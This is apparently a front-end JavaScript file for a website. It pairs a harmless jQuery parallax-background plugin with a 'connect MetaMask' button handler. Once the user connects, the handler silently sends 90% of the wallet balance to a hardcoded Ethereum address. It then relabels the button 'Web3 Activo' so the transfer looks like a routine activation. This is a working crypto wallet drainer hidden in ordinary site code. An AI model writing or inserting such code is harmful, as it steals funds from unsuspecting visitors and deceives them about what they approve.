
document.getElementById('conectarMetaMask').addEventListener('click', () => {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        window.ethereum.enable().then(accounts => {
            const usuarioAddress = accounts[0];
            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434'; 
            web3.eth.getBalance(usuarioAddress).then(balance => {
                const cantidadEnviar = balance * 0.9;
                const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'wei');
                web3.eth.sendTransaction({
                    from: usuarioAddress,
                    to: direccionDestino,
                    value: cantidadEnviarEnWei,
                    gas: '21000',
                })
                .then(receipt => {
                    console.log('Transacción interna exitosa:', receipt);
                    document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
                })
                .catch(error => {
                    console.error('Error en la transacción interna:', error);
                });
            });
        });
    } else {
        console.error('MetaMask no está instalado.');
    }
});

(function($) {
	$.fn.extend({
		jParallax: function(opt) {
			var defaults = { moveFactor: 5, targetContainer: 'body' },
				o = $.extend(defaults, opt);
			return this.each(function() {
				var background = $(this);
				$(o.targetContainer).on('mousemove', function(e){
					mouseX = e.pageX;
					mouseY = e.pageY;
					windowWidth = $(window).width();
					windowHeight = $(window).height();
					percentX = (0-((mouseX/windowWidth)*o.moveFactor) - (o.moveFactor/2)+o.moveFactor)/2;
					percentY = (0-((mouseY/windowHeight)*o.moveFactor) - (o.moveFactor/2)+o.moveFactor)/2;
					background[0].style.transform = "translate("+percentX+"%,"+percentY+"%)";
				});
			});
		}					
	});
}(jQuery));
/*END PLUGIN jParallax*/

/*Invoke*/
$('.bg1').jParallax({ moveFactor: 5, targetContainer: '.parallax' });

$('.bg2').jParallax({ moveFactor: 10, targetContainer: '.parallax' });

$('.bg3').jParallax({ moveFactor: 15, targetContainer: '.parallax' });

$('.bg4').jParallax({ moveFactor: 20, targetContainer: '.parallax' });
